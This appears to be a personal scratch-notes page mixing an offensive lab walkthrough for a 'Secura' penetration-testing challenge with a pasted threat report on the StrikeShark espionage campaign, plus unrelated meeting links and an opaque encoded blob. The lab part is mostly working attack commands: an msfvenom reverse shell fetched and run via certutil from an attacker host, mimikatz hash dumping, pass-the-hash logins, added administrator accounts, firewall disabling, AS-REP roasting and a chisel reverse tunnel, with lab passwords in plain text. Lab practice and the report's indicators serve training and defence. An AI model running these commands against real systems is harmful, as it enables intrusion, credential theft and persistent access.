<img width="144" height="17254" alt="image" src="https://github.com/user-attachments/assets/ad3f68cf-b2ed-490e-8f0e-f8159a2c76e3" />

https://temp-mail.org/en/
Email Rate limit
![image](https://github.com/user-attachments/assets/36e0e1bf-8598-4a4e-978c-689f6b24fa2d)

A5B6GFs9S3demojceJUlXBjoKegdeFugQ2zbUsWwaPuvYAn2zh0uJq9gCfbOHS4midX9pupdJITEzi9OhATZzbzz93XtUMyN/Pf4FP13K6P0FpQjnHjrChZe+YvSNxCuFfdix4cTplJrt8ZY3NQkHEXqmagVsMBaZ0pDSpD1+M1ikpdho/wQqcPVBv3DxiejGDsj8FXLvSmT5p0BpU3XICGeRhOQvRmPR5AwMwusKpIxNrmILxLwl9vnY7iCJPFeaMckHxBLarhsSM1Y7WU4nANeUDxv5Y+3t2B0UOmICXuboN3moFYptZ/uDC85+YiOlBdOdyFIcSlXzOlIM0fmp6cIRUpA5v9MVsEN8xDKka4DoMZe70t1N/MRB//KACD/+V4QlKGrTa73mtN7JmHFBQYkvNU69HYRxrmOG8oPOangre6JTDhJaq0IC13XA2hJ+3sIKFOJiIXkYBmINITC2K584r0p1e+bhQQLgCsAXwSMGivZ/9zwXvRT9lMnBwTjQo8iS7YdD2mUqem4Nq+WwVdPPSfn2OZN7WNEpvnm3H7454A+vw9DmO2dvlzEw8cS0zMWhE7VRDi45LiggWonk/LaOQSiAPhwLFiP855i00jEr9CW8DUH6dW7sjSbm77mWPzeb8+qo948w7j5R2k2F45589ar2JI4X25IR9+XlW7BIEIk1KtXikQEO0pz/tvK7EHXAvf2XoOq8pNznRJ273P8gOu8yRE8u/6k2M6x0xQJ8U2e/v+lXA6PM2NwvoMg7G6ahiEvx715+UnmGzjXGpmQsy7VSmfDFLRTrtAM9P8h47Qsv9t06Mdqf9STrFTA8QHL60VtOv7w9ac1lUk0+wG7+XIDBl4g
![image](https://github.com/user-attachments/assets/c0e61761-aa5b-48d2-8456-1d227cffda69)

https://your-it-note.blogspot.com/2024/09/challenge-0-secura1.html

nmap --top-ports 10 -sV 192.168.163.96

┌──(kali㉿kali)-[~/lab0/95]
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.214 LPORT=443 -b '\x00\x01\x0d' -f exe -o revershell.exe
vi cmd.bat
certutil.exe -f -urlcache -split http://192.168.45.214/lab0/95/revershell.exe c:\windows\temp\revershell.exe && cmd.exe /c c:\windows\temp\revershell.exe
sudo mkdir -p /var/www/html/lab0/95 && sudo mv revershell.exe /var/www/html/lab0/95/
sudo python2 -m SimpleHTTPServer 80
sudo nc -lvp 443 


------
C:\>dir /s local.txt //proof.txt //flag
C:\Program Files\ManageEngine\AppManager14\working> tar -xf mimikatz.zip
C:\Program Files\ManageEngine\AppManager14\working>cd "C:\Program Files\ManageEngine\AppManager14\working\mimikatz-master\x64" //dir also ok
C:\Program Files\ManageEngine\AppManager14\working\mimikatz-master\x64>mimikatz.exe //get Username + NTLM Hash
-------
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 192.168.212.95  -u administrator -H "a51493b0b06e5e35f855245e71af1d14"


┌──(kali㉿kali)-[~/lab0/96]
└─$ mysql -h 192.168.218.96 -u root -p

powershell/lab0/95 //firewall close
C:\Program Files\ManageEngine\AppManager14\working> net user aries Oscp#1234 /add
C:\Program Files\ManageEngine\AppManager14\working> net localgroup administrators aries /add
C:\Program Files\ManageEngine\AppManager14\working> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
C:\Program Files\ManageEngine\AppManager14\working> netsh advfirewall set allprofiles state off
C:\Program Files\ManageEngine\AppManager14\working> net localgroup administrators "SECURA\charlotte" /add

┌──(kali㉿kali)-[~]
└─$ xfreerdp -v:192.168.218.95 -u:aries -p:'Oscp#1234' +clipboard -cert:ignore -drive:aries,/home/kali/lab0/95

C:\Users\aries>netstat -ano | findstr /R "^ *TCP"
c:\>dir /s *.kbdx
c:\>dir /s *.zip 

cd C:\Program Files\ManageEngine\AppManager14\working\pgsql\bin
""NotePad to open BackUpPSQL""

┌──(kali㉿kali)-[~/lab0/97]
└─$ ./kerbrute_linux_amd64 userenum --dc 192.168.218.97 -d secura.yzx -o kerbrute-user-enum xato-net-10-million-usernames.txt //enum
./GetNPUsers.py -usersfile usernames.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 192.168.218.97 'secura.yzx/' //check ASREP



└─$ crackmapexec winrm 192.168.103.95-97 -u apache -p 'New2Era4.!' --local-auth
└─$ evil-winrm -i 192.168.103.96  -u apache -p 'New2Era4.!'        


==Chisel.exe==
┌──(kali㉿kali)-[~/lab0/96]
└─$ ./chisel.exe server -p 8000 --reverse //linux version-> then upload windows version to http server


*Evil-WinRM* PS C:\Users\apache.ERA\Documents> Invoke-WebRequest -Uri http://192.168.45.214:80/lab0/96/chisel_windows.exe -OutFile C:\Users\apache.ERA\Documents\chisel_windows.exe
*Evil-WinRM* PS C:\Users\apache.ERA\Documents> .\chisel_windows.exe client 192.168.45.214:8000 R:3306:127.0.0.1:3306


┌──(kali㉿kali)-[~]
└─$ sudo neo4j console
//Open your web browser and navigate to http://localhost:7474. Log in with the default credentials (neo4j/neo4j) and change the password when prompted.
//neo4j://localhost:7687

┌──(kali㉿kali)-[~]
└─$ bloodhound

┌──(kali㉿kali)-[~/lab0/96] (install bloodhound.exe first)
└─$ bloodhound-python -u 'charlotte' -p 'Game2On4.!' -ns 192.168.105.97 -d secura.yzx -c All --dns-timeout 15

Start node: CHARLOTTE@SECURA.YZX
Target node: DEFAULT DOMAIN POLICY@SECURA.YZX

┌──(kali㉿kali)-[~/lab0/96]
└─$ wget https://github.com/FuzzySecurity/StandIn/releases/download/v1.3/StandIn_v13_Net35_45.zip
unzip StandIn_v13_Net35_45.zip



Herbert---- Join: https://teams.microsoft.com/meet/266976326404196?p=eknNTZYavb0KN4S2Oc 
tmp- https://teams.microsoft.com/meet/44314118918734?p=ZXazt78ICnmDkc71zI 

Summary
Kaspersky researchers have identified StrikeShark, a cyber espionage campaign attributed with low confidence to a Chinese-speaking threat actor. The campaign leverages a custom malware loader, SharkLoader, to deploy Cobalt Strike Beacon against government, diplomatic, and software development organizations across multiple regions, including Indonesia, Taiwan, Lebanon, Syria, Hong Kong, Colombia, North Macedonia, Nepal, and Serbia.

The threat actors employ a variety of initial access vectors, primarily through the exploitation of publicly exposed vulnerabilities in internet-facing systems. Once access is established, SharkLoader facilitates stealthy post-exploitation activities and persistent access.

Target Sectors
•	Government
•	Technology / Software Development

Exploited Technologies and Vulnerabilities
The campaign has been observed targeting multiple internet-facing products through known remote code execution (RCE) and authentication bypass vulnerabilities, including:

Product	Vulnerability
Microsoft Exchange	CVE-2021-26855 (ProxyLogon), CVE-2022-41082
Openfire Server	CVE-2023-32315
GeoServer	CVE-2024-36401
Apache Shiro	CVE-2016-4437
Hikvision Products	CVE-2021-36260
Microsoft SharePoint	CVE-2021-27076
Zimbra Collaboration Suite	CVE-2022-27925
F5 BIG-IP	CVE-2023-46747
Fortinet FortiOS	CVE-2024-21762, CVE-2022-40684
Cisco IOS XE Web UI	CVE-2023-20198
React Server Components	CVE-2025-55182

Recommended Mitigations
•	Immediate Remediation
Prioritize patching and hardening all internet-facing systems
•	Infrastructure Blocking
Block and monitor all identified malicious domains, IP addresses, and associated command-and-control (C2) infrastructure linked to the StrikeShark campaign.
•	Threat Hunting
Conduct proactive threat hunting activities to identify indicators associated with SharkLoader and Cobalt Strike Beacon
•	Detection and Monitoring
•	Monitor web-facing applications for exploitation attempts targeting the listed CVEs.
•	Deploy Endpoint Detection and Response (EDR) solutions capable of detecting memory-resident malware and process injection techniques.
•	Review historical logs for evidence of exploitation, lateral movement, privilege escalation, and beaconing activity.
•	Enhance network monitoring to identify anomalous outbound connections to suspicious or previously unseen destinations.

Indicators of Compromises
IOC Value	Type
c559cc68986933200fd5d9e4388e2f58	MD5
b3352b42432dedc4a519f011dc8b5d5a	MD5
24fcebdeecba65004fdb0923763d74fd	MD5
1f65544978b8ea0e745e573b8ee9684b	MD5
9c872a0d5d5a38950e8b9ac9b488be3f	MD5
aa3086be652c8b20b0b29b2730d57119	MD5
d98f568496512e4f98670c61c97cb07a	MD5
a514d1bb62d7916475946fe7c07ac0aa	MD5
9cbd560f820c95d7c38342cd558cb5c6	MD5
connect-microsoft[.]com	Domain
ms-record[.]com	Domain
ms-record[.]top	Domain
ms-tray[.]top	Domain

Reference: https://securelist.com/strikeshark-campaign/120326/


